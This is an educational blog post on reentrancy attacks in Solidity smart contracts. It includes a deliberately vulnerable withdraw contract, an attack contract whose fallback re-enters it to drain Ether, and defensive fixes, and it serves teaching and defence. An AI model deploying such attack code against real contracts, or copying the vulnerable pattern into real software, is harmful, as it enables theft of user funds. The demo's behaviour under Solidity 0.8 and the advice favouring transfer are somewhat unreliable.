---
layout: post
title: Reentrancy Attack
excerpt: This can lead to various issues such as fund loss, unauthorized access, or even complete contract failure.
date: 2024-07-22
updatedDate: 2024-07-22
featuredImage: /blog/images/posts/76e1bbbc-b48e-4a3a-b467-15df1db488f9.webp
tags:
  - post
  - security
  - ethereum
  - solidity
  - smart-contracts
  - wtf
---

**Reentrancy attacks** are one of the common security issues that can occur in Solidity smart contracts. They exploit the fact that **a function can be called multiple times before it finishes execution**.  
*When a contract A calls a function in contract B, contract B can call back into contract A while it is still running. If contract A has not finished executing and is still holding state, contract B can potentially manipulate that state to gain an unfair advantage.*  
This can lead to various issues such as fund loss, unauthorized access, or even complete contract failure.

![](https://media.geeksforgeeks.org/wp-content/uploads/20230130125653/Redesign-blockchain-1.png)

> The most famous reentrancy attack occurred in 2016, resulting in the loss of 3.6 million Ether and leading to the Ethereum hard fork, creating Ethereum (ETH) and Ethereum Classic (ETC) also known as, **The DAO Hack**.

WETH Attack: First ever reentrancy attack was [reported](https://www.reddit.com/r/ethereum/comments/4nmohu/from_the_maker_dao_slack_today_we_discovered_a/?user_id=360657100019) on Maker DAO Slack. It can tracked on [github issue](https://github.com/pcaversaccio/reentrancy-attacks/issues/1). It was an intentional one and [a patch](https://github.com/blockchainsllc/DAO/pull/242) was later merged about it. You can find more details in [web archive](https://web.archive.org/web/20170615055530/http://vessenes.com/more-ethereum-attacks-race-to-empty-is-the-real-deal/).

Just in 2021 and 2022 alone, more than a dozen attacks has happened around this. [Rari Capital Expoit](https://nipunp.medium.com/5-8-21-rari-capital-exploit-timeline-analysis-8beda31cbc1a), [Cream Finance](https://inspexco.medium.com/reentrancy-attack-on-cream-finance-incident-analysis-1c629686b6f5), [Fei Protocol](https://certik.medium.com/fei-protocol-incident-analysis-8527440696cc), [Ola Finance](https://www.coindesk.com/tech/2022/03/31/ola-finance-exploited-for-36m-in-re-entrancy-attack/), [Hyperbears](https://blocksecteam.medium.com/when-safemint-becomes-unsafe-lessons-from-the-hypebears-security-incident-2965209bda2a). [BurgerSwap](https://x.com/BlockSecTeam/status/1546141457933025280), [Revest Finance](https://therecord.media/2-million-stolen-from-defi-protocol-revest-finance-platform-unable-to-reimburse-victims), [PolyDex](https://polydex.medium.com/plx-locker-smart-contract-incident-post-mortem-75342124a3e8), and so on...

### How does it Work

In a typical reentrancy attack, an attacker exploits the way Ethereum handles external calls and the sequence in which state changes and value transfers are performed. Here’s a simplified flow:

1. **Attack Contract Initiation**: The attacker deploys a malicious contract.
    
2. **Initial Call**: The attacker triggers a function in the vulnerable contract that sends Ether to the attacker's contract.
    
3. **Fallback Function**: The attacker's contract contains a fallback function that calls the vulnerable contract again before the first function call finishes.
    
4. **Repeated Calls**: The process repeats, allowing the attacker to drain funds from the vulnerable contract.
    

### Example of a Vulnerable Contract

Here's a basic example of a vulnerable Solidity contract:

```solidity
pragma solidity ^0.8.0;

contract VulnerableContract {
    mapping(address => uint) public balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw(uint _amount) public {
        require(balances[msg.sender] >= _amount);
        (bool sent, ) = msg.sender.call{value: _amount}("");
        require(sent, "Failed to send Ether");
        balances[msg.sender] -= _amount;
    }
}
```

In this contract, the `withdraw` function updates the user's balance after sending Ether. This sequence creates a window for a reentrancy attack.

### Exploiting the Vulnerability

The attacker's contract might look like this:

```solidity
pragma solidity ^0.8.0;

import "./VulnerableContract.sol";

contract AttackContract {
    VulnerableContract public vulnerableContract;

    constructor(address _vulnerableContractAddress) {
        vulnerableContract = VulnerableContract(_vulnerableContractAddress);
    }

    fallback() external payable {
        if (address(vulnerableContract).balance >= 1 ether) {
            vulnerableContract.withdraw(1 ether);
        }
    }

    function attack() public payable {
        vulnerableContract.deposit{value: 1 ether}();
        vulnerableContract.withdraw(1 ether);
    }
}
```

### How to Avoid Reentrancy Attacks

1. **Check-Effects-Interactions Pattern**: Ensure all internal state changes occur before external calls. This pattern involves three steps:
    
    * **Checks**: Validate conditions.
        
    * **Effects**: Update internal state.
        
    * **Interactions**: Make external calls.
        
    
    ```solidity
    function withdraw(uint _amount) public {
        require(balances[msg.sender] >= _amount);
        balances[msg.sender] -= _amount;
        (bool sent, ) = msg.sender.call{value: _amount}("");
        require(sent, "Failed to send Ether");
    }
    ```
    
2. **Reentrancy Guards**: Use the `nonReentrant` modifier from OpenZeppelin’s ReentrancyGuard contract to prevent reentrant calls.
    
    ```solidity
    import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
    
    contract SecureContract is ReentrancyGuard {
        mapping(address => uint) public balances;
    
        function withdraw(uint _amount) public nonReentrant {
            require(balances[msg.sender] >= _amount);
            balances[msg.sender] -= _amount;
            (bool sent, ) = msg.sender.call{value: _amount}("");
            require(sent, "Failed to send Ether");
        }
    }
    ```
    
3. **Avoid** `call` Method: Prefer using `transfer` and `send` methods, which have a fixed gas limit and prevent reentrancy attacks. However, be aware of gas limit changes in [EIP-1884](https://eips.ethereum.org/EIPS/eip-1884).
    
    ```solidity
    function withdraw(uint _amount) public {
        require(balances[msg.sender] >= _amount);
        balances[msg.sender] -= _amount;
        payable(msg.sender).transfer(_amount);
    }
    ```
    

### Best Practices

1. **Audit Regularly**: Regularly audit smart contracts to identify and mitigate vulnerabilities.
    
2. **Use Established Libraries**: Utilize well-known libraries and packages like OpenZeppelin for security functions.
    
3. **Test Thoroughly**: Conduct extensive testing, including unit tests and fuzz testing, to uncover potential weaknesses.
    
4. **Limit External Calls**: Minimize the number of external calls in your contract, especially those involving value transfers.
    

:)
